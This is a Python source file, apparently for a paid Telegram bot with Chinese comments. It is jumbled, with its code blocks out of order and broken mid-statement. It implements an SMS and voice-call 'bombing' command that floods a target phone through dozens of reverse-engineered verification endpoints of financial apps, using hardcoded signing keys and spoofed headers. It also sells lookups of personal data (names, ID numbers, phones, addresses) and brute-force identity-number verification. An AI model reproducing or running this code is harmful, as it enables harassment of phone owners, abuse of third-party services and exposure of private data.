        headers={'User-Agent': "okhttp/5.0.0-alpha.11", 'x-platform': "android", 'Content-Type': "application/json"})

# --- 新接口：平安期货 ---
def pingan_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/pinganOauth/send"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7yRhpJe7xf2th+9O1cmBCE+3OrB+hNZfuax6rTJ7if0uqGsFkfDRYJCldm4OXE+WjPLJQaG9DlCjMCB/SQFwa/dihzdgaV27Kpdq2FR/Uat1L+WQ+xwik5AhMKT5LnL0Iw9rNpXPzAxBBnfAhrc3PsTbBwTE4oaQeWC6dDMB/4IBB+C3w2cClW3Ut6E/qPydQwbYRtNWc4XZBLGJKrurWwdLRYKDWbF8SeKvvnyQipATRJ7D+JocvOY+EP6FiUAA0kGFG+4/P0vQNCaRexZFKQKjHKGR5nunJnmJtsjar/nix7VZyenWjEfnPkf7IwxZIZqpCOJb8JBfozRztHMDiwIDAQAB"
    pem_key = f"-----BEGIN PUBLIC KEY-----\n{RSA_KEY}\n-----END PUBLIC KEY-----"
    try:
        rsa_key = RSA.importKey(pem_key)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = base64.b64encode(cipher.encrypt(phone.encode())).decode()
    except:
        return False
    return make_request_new(API_URL, "POST", data={'encryptMobile': encrypted, 'qsId': "734"},
        headers={'Host': "ftoem.10jqka.com.cn:9443", 'User-Agent': "GPingA_Futures/2.0.4"})

# --- 新接口：中民保险 ---
def zhongmin_insurance(phone):
    API_URL = "https://interface.insurance-china.com/SendCode_SMS"
    SECRET = "zhongmin_zm123"
    sign = hashlib.md5((phone + SECRET).encode()).hexdigest()
    return make_request_new(API_URL, "GET", params={'phone': phone, 'type': 3, 'sign': sign},
        headers={'User-Agent': "zbt_Android"})

# --- 新接口：驰度数据 ---
def chidu_data(phone):
    API_URL = "https://api.chidudata.com/API/index.php/api/login/sendCode"
    KEY = "2E2J4x0XKBs6PgTbq2BaMyFrE0OxadXP"
    timestamp = str(int(time.time() * 1000))
    sign = hashlib.md5(f"phone={phone}&timestamp={timestamp}&key={KEY}".encode()).hexdigest().upper()
    return make_request_new(API_URL, "POST", data={'timestamp': timestamp, 'phone': phone, 'sign': sign},
        headers={'version': "250623", 'appID': "1", 'platform': "android"})

# --- 新接口：广科贷 ---
def guangkedai(phone):
    API_URL = "https://uoil.gkoudai.com/UserWebServer/sms/sendPhoneCode"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsfEjWk0jIPOqrfD943VzyGN0Z8SD3B1Fb8gL67bNo+epQaE6TqlP3j7exFdNdfgGwmFe/uX2m3HfDjjxShC8O5E3iuBwk8HECHO6+FeNZfhlJQqJ53YK39K2u1Bjuv325ZJllYea4NeqkrX4WkbSX7igys05Ziof9tmR2dQTcCwIDAQAB"
    plain = f"phone={phone}&type=register&encript_key=RQACYEZPWMANBOLNXFZPUCMC&"
    encrypted_x = rsa_encrypt_pkcs1(plain, RSA_KEY)
    if not encrypted_x: return False
    timestamp = str(int(time.time() * 1000))
    sign_content = f"sojex/3.9.7sms/sendPhoneCode{timestamp}gkoudaiAndroid3.9.7OnePlus_OP5D77L15526493830958OPD2404_15.0.0.601%28CN01%29OPD2404_ANDROID_15"
    sign = hashlib.md5(sign_content.encode()).hexdigest()
    return make_request_new(API_URL, "POST", data={'x': encrypted_x},
        headers={'User-Agent': "sojex/3.9.7", 'time': timestamp, 'sign': sign})

# --- 新接口：财之道 ---
def caizhidao(phone):
    API_URL = "https://ngssa.caizidao.com.cn/ngssa/api/auth/sms/v1/send"
    KEY = bytes.fromhex("4d6b6753484b4f594370346a374f614c2b426b42384f6455")
    IV = bytes.fromhex("65577734616e706b5a54423662336335")
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    sms_ok = make_request_new(API_URL, "POST", data=json.dumps({"mobile": encrypted, "type": "0"}),
        headers={'User-Agent': "okhttp/4.9.0", 'Content-Type': "application/json; charset=utf-8"})
    time.sleep(6)
    voice_ok = make_request_new(API_URL, "POST", data=json.dumps({"mobile": encrypted, "receiveType": "voice"}),
        headers={'User-Agent': "okhttp/4.9.0", 'Content-Type': "application/json; charset=utf-8"})
    return sms_ok or voice_ok

# --- 新接口：方正期货 ---
def founder_futures(phone):
    API_URL = "https://qhapi.founderfu.com:11443"
    KEY = bytes.fromhex("3965594b4b36793138496e6756345141")
    IV = bytes.fromhex("3965594b4b36793138496e6756345141")
    business = {"market": "oppo", "brokerId": "0007", "f": "fzqh", "v": "1", "h": "sendCode", "mobile": phone, "channel": "oppo", "appkey": "100241", "version": "1.3.7", "platform": "1"}
    try:
        json_str = json.dumps(business, separators=(',', ':'))
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(json_str.encode("utf-8"), AES.block_size, style="pkcs7")
        encryptdata = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    return make_request_new(API_URL, "POST", data={'t': "2025-10-27 07:16:30", 'sign': "63352d64c6916beefe68556e27501f07", 'encryptdata': encryptdata},
        headers={'User-Agent': "okhttp-okgo/jeasonlzy"})

# --- 新接口：Talicai ---
def talicai(phone):
    API_URL = "https://www.talicai.com/api/v1/accounts/sms"
    SECRET = "f09d5cd3!0390409e#98e6544dd16645%20"
    timestamp = int(time.time() * 1000)
    sign = hashlib.md5(f"mobile={phone}|sms_type=1|timestamp={timestamp}|type=4{SECRET}".encode()).hexdigest()
    return make_request_new(API_URL, "POST", data=json.dumps({"mobile": phone, "sign": sign, "sms_type": 1, "timestamp": timestamp, "type": 4}),
        headers={'User-Agent': "Talicai/6.23.2(Android)", 'Content-Type': "application/json"})

# --- 新接口：HRHG ---
def hrhg_stock(phone):
    url = "https://cms.hrhgstock.com/api/userNew/sendCode"
    KEY = "41594d74363448486b76435a734546787273337143773d3d"
    try:
        key_bytes = bytes.fromhex(KEY)
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    return make_request_new(url, "POST", data=json.dumps({"phone": encrypted, "type": 1}),
        headers={'Content-Type': "application/json; charset=UTF-8"})

# --- 新接口：ChinaHGC ---
def chinahgc(phone):
    url = "https://czd.chinahgc.com/uaa/oauth/sms-code"
    KEY = "4c696e4c6f6e674576656e7432303231"
    try:
        key_bytes = bytes.fromhex(KEY)
        iv_bytes = bytes.fromhex(KEY)
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    return make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "type": "auth"}),
        headers={'crypt-version': "1", 'Content-Type': "application/json"})

# --- 新接口：东方财富 ---
def eastmoney(phone):
    url = "https://wgkhapihdmix.18.cn/api/RegistV2/VerificationCode"
    KEY = "6561737461626364"
    IV = "6561737461626364"
    try:
        cipher = DES.new(bytes.fromhex(KEY), DES.MODE_CBC, bytes.fromhex(IV))
        padded = pad(phone.encode("ascii"), DES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    sign = hashlib.md5(f"{phone}DFCFKH27".encode()).hexdigest()
    return make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "smsRndVcode": sign, "IsEncrypt": "10"}),
        headers={'User-Agent': "okhttp/3.12.13", 'EM-OS': "Android"})

# --- 新接口：Wogoo ---
def wogoo(phone):
    url = "https://www.wogoo.com/server/szfyOfficialWebsite/v2/sendMessage"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx6Cu1q/suUGyXQMALQoTY2kK2rybWdkeNLjhZPJZRjShXWoYWCdly04HxhQC3WV+fZOu64WYOwBQaoKnGX1Ten1lByVgo/u0q4vZwAj5axHwmMq7LkebWWeVC54DCfANUegL9nthXkoJJe0SsNflEinzjWSUwHjQkQeOBMq8wODXakvyJPwwb/PU29QPlKQfNxgM/44K4U1ZTvZUFgSYVtIx6/1W3by7FSoCr3Ik988ptbq1ruhPtxW7x1bjQbTLayLPD2CYDOL2/px+8hypMbXUXSmYcur5ulSLVhZ73btret7xz0gjFZCXePn7OR/6I9CtF/PztA229baXIwZE2wIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'PHONE': encrypted, 'type': "0"},
        headers={'User-Agent': "okhttp-okgo/jeasonlzy", 'X-White-List': "app4.0"})

# --- 新接口：博时基金 ---
def bosera(phone):
    url = "https://m.bosera.com/ftc_prd/matrix/auth/login/v1/sendVerifyCode"
    params = {"prefix": "bs_fd_cr", "update_version": "1109", "app_version": "8.7.8", "device_model": "OPD2404", "application_id": "bd0ef3d09dc8804f6ff82ae4983d50a5", "channel_id": "bsfund", "access_token": str(uuid.uuid4()), "device_id": f"ra_{random.randint(1000000000000, 9999999999999)}", "platform_type": "oppo", "build_version": "20251015095235"}
    sign_str = "".join([params[k] for k in sorted(params.keys()) if k != "access_token"]) + params["prefix"]
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    return make_request_new(url, "POST", data={**{k.replace("_", ""): v for k, v in params.items()}, 'signature': sign, 'sysId': "1"},
        headers={'knightToken': f"V5{str(uuid.uuid4())}"})

# --- 新接口：ChinaHXZQ ---
def chinahxzq(phone):
    url_template = "https://app.chinahxzq.com.cn:9302/user/captcha?content={enc}"
    KEY = b'5eFhFgJiDwG68DZn'
    IV = b's6NOFsDdkfg3XiRm'
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(f'phone={phone}'.encode("utf-8"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
        url_safe = encrypted.replace('+', '-').replace('/', '_').rstrip('=')
    except:
        return False
    return make_request_new(url_template.format(enc=url_safe), "GET", headers={'Host': 'app.chinahxzq.com.cn:9302', 'User-Agent': 'okhttp/4.10.0'})

# --- 新接口：同花顺期货 ---
def tonghuashun(phone):
    url = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/gtjaOauth/send"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3r6vWlyL7i0CbDvFn0G41Ch9zZX4eja9mhWShpH/Tjcar+KB2kFSab5dkxKCkcJek7WwKsvgL5a38qOVeq8NJVkbVD0iD5qT/E+4NOYtS/HEvB/mDOB+YAB4afjI6iwuTuTa4AztXO9zh0lSHDUbA5OMWR6aCP1bHGNJzLHEtLRSD9EE4C6OG9guws8kKKN4I7lGsbdXA705iOvF+SZkbriSf/OglOZSWUIZK6sZLYT7kqvxZeDxJkZxJDbKVEpEgtBdCNsSPZhAr538/Ecv4QnbfMV7YHeVIx/OFCfRyKoGJqglMy3Y3ZD6DGponboKubz4iib7mTYfgWwgF1qKQIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    timestamp = str(int(time.time()))
    sign = hashlib.md5(f"37dc6e6beb603a86{timestamp}".encode()).hexdigest()
    return make_request_new(url, "POST", data={'encryptMobile': encrypted, 'platform': "Android", 'uuid': "37dc6e6beb603a86", 'appVersion': "3.2.6", 'osVersion': "35", 'model': "OPD2404", 'sign': sign, 'timestamp': timestamp})

# --- 新接口：Romaway ---
def romaway(phone):
    time.sleep(5)
    return make_request_new("https://webapi.zn.romaway.cn/sms/sendCodeByMobile", "POST",
        data=json.dumps({"userId": "01319bd2102982fcaddd74ea26f5b233", "guId": "01319bd2102982fcaddd74ea26f5b233", "businessSign": "financial_terminal", "mobile": phone}),
        headers={'User-Agent': "dzapp/", 'Content-Type': "application/json", 'origin': "https://webrw.zn.romaway.cn"})

# --- 新接口：普普基金 ---
def pupu_fund(phone):
    url = "https://wapp.ppwfund.com/v1/user/sendVerificationCode"
    SECRET = "AGAO57D4E5FY27H8I9J0G1I4"
    def des3_encrypt(text):
        key = SECRET.encode().ljust(24, b'\x00')
        cipher = DES3.new(key, DES3.MODE_ECB)
        padded = pad(text.encode(), DES3.block_size, style='pkcs7')
        return base64.b64encode(cipher.encrypt(padded)).decode()
    business = json.dumps({"code_length": "6", "phone": phone, "send_type": "13"}, separators=(',', ':'))
    data = des3_encrypt(business)
    timestamp = str(int(time.time()))
    nonce = str(uuid.uuid4()).replace("-", "").upper()
    sign_str = f"7.11.023{data}3c7ab5c8355a45493a0b9864d6411ce1{SECRET}{nonce}{timestamp}"
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    return make_request_new(url, "POST", data={'app_install_version': "7.11.0", 'app_type': "23", 'device_brand': "OnePlus", 'channel': "oppo", 'device_os_version': "15", 'device_mode': "OPD2404", 'device_type': "2", 'device_uuid': "3c7ab5c8355a45493a0b9864d6411ce1", 'data': data, 'nonce': nonce, 'timestamp': timestamp, 'sign': sign})

# --- 新接口：中信建投 ---
def zhongxinjiantou(phone):
    url = "https://ftapi.10jqka.com.cn/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3YVAkvdYlilG3mgYdGxeJEVFHATB9JL2dZKkoRhb0Dy1TNMp/4Y4PRyv0zxdGHN5lLpJ9ik4AMNaWYUE9u1X9GjtOg4QX0jxDXLkTeWWX0dzeYUCTb3PmAhUE5ZtOtZMt+z6lOODfvcJGe2iCqEFN4JoSmL5aBC9jHMysskZQZQIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'encryptMobile': encrypted, 'qsId': "569"}, headers={'User-Agent': "GZXJT_Futures/ (Royal Flush)"})

# --- 新接口：财之道双发 ---
def caizhidao_double(phone):
    url = "https://czdcosm-ssa.caizidao.com.cn/czdcosm-ssa/api/auth/sms/v1/send"
    KEY = "MkgSHKOYCp4j7OaL+BkB8OdU"
    IV = "eWw4anpkZTB6b3c5"
    try:
        cipher = AES.new(KEY.encode(), AES.MODE_CBC, IV.encode())
        padded = pad(phone.encode(), AES.block_size, style='pkcs7')
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    voice_ok = make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "receiveType": "voice"}), headers={'User-Agent': "okhttp/4.9.0"})
    time.sleep(3)
    sms_ok = make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "type": "0"}), headers={'User-Agent': "okhttp/4.9.0"})
    return voice_ok or sms_ok

# --- 新接口：恒泰期货 ---
def hengtai(phone):
    url = "https://multiapp.hsqh.net:4443/user/service/key/qrcodeService/sendVerificationCode"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwVwJ12WGdZBJApmMgj0hNQWQzbHDuEoHHYJIavS1raCbIOgXAxBAyzRjasrkXefDY0qL2pwFKaijhOMY46c357BEd+tr6OuixZHw/GNms4Aytd4AQFhOoZw3LOO58GPq5SaAYZ16bHaCtmVHEf9eQUkAA5QMnd2+ZuykkGnE0mMS6asGJ3D0sedh0Q2fu64ekJqlfa/4BBKbljxzgNH4KbG6TcrTxSu56iGTUiQK/F76E4BnPtejdtDPbClf2qrXyY+YidMtliRnorrK1k7f3PYiU16124eist70D5QcIxCS983apg5wquoAz2OW6+C4xSHLADEUka+SpmLL9NgE/QIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'secretKey': "1", 'scene': "1", 'phone': encrypted}, headers={'user-app-version': "2.0.0", 'bundle_id': "com.hsqh.futures"})

# --- 新接口：光大期货 ---
def guangda(phone):
    url = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6s72YtZTNHvsf2rtS12SX3PcxFamWYqw0XYl4+w/kJ5v/IgZQ82+yQ/+NyQGWP28nIxCkznKQA/OI4ET9zp4nGq4lN5wcfpvkHyYu4Neo3seuIHsYb2xHDt5RHXTfXBE6hRtW8JxMTkqOI3CP9AQr4vUj66amz02k9gsulw6X/wIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'encryptMobile': encrypted, 'qsId': "541"}, headers={'User-Agent': "GGuangDa_Futures/ (Royal Flush)"})

# 新接口列表
NEW_PLATFORMS = [
    zhongliang_futures, xiamen_rongda, pingan_futures, zhongmin_insurance,
    chidu_data, guangkedai, caizhidao, founder_futures, talicai, hrhg_stock,
    chinahgc, eastmoney, wogoo, bosera, chinahxzq, tonghuashun, romaway,
    pupu_fund, zhongxinjiantou, caizhidao_double, hengtai, guangda
]

def get_all_senders():
    all_funcs = []
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            try:
                sig = inspect.signature(obj)
                if len(sig.parameters) >= 1: all_funcs.append(obj)
            except: pass
    # 添加新接口
    all_funcs.extend(NEW_PLATFORMS)
    return all_funcs

@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 5.5: return bot.reply_to(message, "积分不足(5.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 5.5; save_points()
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

# ================= 6. 管理与业务指令 =================

@bot.message_handler(commands=['cyh'])
def cyh_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足(2.5)！")
    user_states[message.chat.id] = {'step': 'cyh_id'}
    bot.send_message(message.chat.id, "请输入要查询的身份证号：")

@bot.message_handler(commands=['hb'])
def hb_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足！")
    bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "👑 **管理员控制台**\n\n`/add ID 分数`\n`/set_token`", parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def add_points_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        p = message.text.split()
        tid, amt = int(p[1]), float(p[2])
        user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
        bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
    except: pass

@bot.message_handler(commands=['set_token'])
def set_token_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "请输入X-Token：")
    bot.register_next_step_handler(msg, lambda m: [save_token(m.text.strip()), bot.send_message(m.chat.id, "✅ Token已更新")])

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in user_points: user_points[uid] = 0.0
    bot.send_message(message.chat.id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())

@bot.message_handler(commands=['pl'])
def pl_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 2.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'v_name'}
    bot.send_message(message.chat.id, "请输入姓名：")

@bot.message_handler(commands=['bq'])
def bq_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'g_card'}
    bot.send_message(message.chat.id, "请输入身份证号（未知用x）：")

@bot.message_handler(commands=['2ys'])
def cmd_2ys_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    bot.send_message(message.chat.id, "请输入**姓名 身份证号**", parse_mode='Markdown')

@bot.message_handler', errors='ignore')
            return json.loads(decoded_data)
        except ValueError:
            invalid_chars = [b'\0', b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f',
                             b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f']
            for char in invalid_chars:
                decrypted_data = decrypted_data.replace(char, b'')
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
    except (binascii.Error, ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}

# --- 新加：cyh 接口逻辑 ---
def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        
        # 扣除 2.5 积分
        user_points[uid] -= 2.5
        save_points()
        
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **2.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def hb_search_logic(chat_id, search_value, uid):
    url = "https://api.91jkj.com/residentshealth"
    headers = {
        "ACTION": "CM019", "LONGITUDE": "114.900015", "SESSION_ID": "7B243BE72768807FD09C55B8763BDBCB",
        "LATITUDE": "26.796795", "Connection": "Keep-Alive", "ORDER_YYFSDM": "1", "SOURCE": "1",
        "isEncrypt": "1", "Content-Type": "application/x-www-form-urlencoded", "Host": "api.91jkj.com",
        "Accept-Encoding": "gzip", "Cookie": "acw_tc=0bd17c6617316858716663239e5577a2ed3657cc2b8ad00f782bcd8f9d741a", "User-Agent": "okhttp/3.14.9"
    }
    try:
        response = requests.post(url, data={"search": search_value}, headers=headers)
        result_json = json.loads(response.text)
        encrypted_text_hex = result_json.get('data')
        if encrypted_text_hex:
            result_data = decrypt_data(encrypted_text_hex, '26556e9bb82743358da7860606b8f29626556e9bb8274335')
            if "error" in result_data:
                bot.send_message(chat_id, result_data["error"])
            elif "page" in result_data and result_data["page"]:
                user_points[uid] -= 3.5
                save_points()
                result_message = "✅查询结果:\n"
                for item in result_data["page"]:
                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "查询为空")
        else:
            bot.send_message(chat_id, "响应中data字段为空")
    except:
        bot.send_message(chat_id, "查询接口请求异常")

# ================= 3. 辅助功能 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (
        f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分"
    )

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

# ================= 4. 核验逻辑 =================

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.5
        save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
    except: res = "❌ 接口请求失败"
    bot.send_message(chat_id, res, parse_mode='Markdown')

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running = None, True
    lock = threading.Lock()
    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            with lock: current_done = done
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(current_done, total))
            except: pass
    threading.Thread(target=progress_monitor, daemon=True).start()
    def verify(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                with lock:
                    if is_running:
                        user_points[uid] -= 2.5; save_points()
                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素一致\n\n已扣除 **2.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
                        is_running = False
        except: pass
        finally:
            with lock: done += 1
    with ThreadPoolExecutor(max_workers=10) as ex: ex.map(verify, id_list)
    is_running = False
    try: bot.delete_message(chat_id, msg_id)
    except: pass
    bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')

# ================= 5. 短信轰炸 =================

# ============ 新增：新接口函数 ============
import base64
import hashlib
import hmac
import uuid
from urllib.parse import quote
from Crypto.Cipher import AES, DES, DES3, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
import urllib3

urllib3.disable_warnings()

def random_user_agent_new():
    devices = ["SM-G9910", "SM-G9980", "iPhone14,3", "iPhone15,3", "Mi 12", "OPD2404", "RMX2202"]
    android_ver = random.choice(["10", "11", "12", "13", "14", "15"])
    chrome_ver = random.choice(["120.0.6099.109", "125.0.6422.78", "130.0.6723.58", "133.0.6725.153"])
    wechat_ver = random.choice(["8.0.50", "8.0.55", "8.0.61"])
    hex_code = random.choice(["0x28003D34", "0x28003D35", "0x28003D36"])
    return (f"Mozilla/5.0 (Linux; Android {android_ver}; {random.choice(devices)}) "
            f"AppleWebKit/537.36 Chrome/{chrome_ver} Mobile Safari/537.36 "
            f"MicroMessenger/{wechat_ver}({hex_code})")

def make_request_new(url, method="GET", **kwargs):
    try:
        headers = kwargs.pop('headers', {})
        headers.setdefault('User-Agent', random_user_agent_new())
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, timeout=3, verify=False, **kwargs)
        else:
            resp = requests.post(url, headers=headers, timeout=3, verify=False, **kwargs)
        return resp.status_code == 200
    except:
        return False

def rsa_encrypt_pkcs1(plaintext, public_key_b64):
    try:
        key_bytes = base64.b64decode(public_key_b64)
        rsa_key = RSA.import_key(key_bytes)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(plaintext.encode('utf-8'))
        return base64.b64encode(encrypted).decode('utf-8')
    except:
        return None

# --- 新接口：中梁期货 ---
def zhongliang_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
